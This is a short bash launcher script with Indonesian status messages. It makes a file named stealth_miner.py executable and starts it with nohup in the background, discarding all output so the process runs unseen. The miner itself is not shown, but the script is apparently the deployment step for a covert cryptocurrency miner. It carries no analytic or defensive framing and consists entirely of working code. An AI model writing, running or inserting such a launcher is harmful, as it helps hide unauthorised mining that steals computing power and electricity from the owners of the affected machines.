#!/bin/bash
echo "[*] Menjalankan Stealth Miner..."
chmod +x stealth_miner.py
nohup python3 stealth_miner.py > /dev/null 2>&1 &
echo "[✔] Miner berjalan di background."
